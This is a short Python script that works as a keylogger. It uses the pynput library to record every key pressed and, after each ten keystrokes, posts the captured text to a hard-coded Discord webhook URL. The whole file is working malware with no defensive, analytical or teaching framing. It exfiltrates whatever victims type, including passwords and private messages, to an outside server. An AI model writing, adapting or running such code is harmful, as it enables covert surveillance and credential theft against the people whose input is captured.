import requests
import logging
from pynput import keyboard

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# Replace with your Discord webhook URL
webhook_url = "https://discord.com/api/webhooks/1314598947494301766/9e3u1FROKR8Uxfol8WgghR9w6HU7P1Ngkx6hKhPx1_2mynJSMGAcls5yVgIbZgazs1Jw"

# Function to send data to Discord
def send_to_discord(data):
    payload = {"content": data}
    try:
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()
        logging.info("Data sent to Discord successfully.")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error sending data to Discord: {e}")

# Function to log keystrokes and send them to Discord
def keylogger_to_discord():
    keys_buffer = []  # Buffer to store key logs

    def on_press(key):
        try:
            # Convert key to readable format
            keys_buffer.append(key.char)
        except AttributeError:
            # Handle special keys (e.g., Shift, Ctrl)
            keys_buffer.append(f"[{key.name}]")

        # Send the buffer to Discord if it reaches a threshold
        if len(keys_buffer) >= 10:  # Adjust threshold as needed
            data_to_send = ''.join(keys_buffer)
            send_to_discord(data_to_send)
            keys_buffer.clear()  # Clear the buffer after sending

    # Listener for key press events
    with keyboard.Listener(on_press=on_press) as listener:
        logging.info("Keylogger started. Press Ctrl+C to stop.")
        try:
            listener.join()
        except KeyboardInterrupt:
            logging.info("Keylogger stopped.")

# Start the keylogger
if __name__ == "__main__":
    keylogger_to_discord()
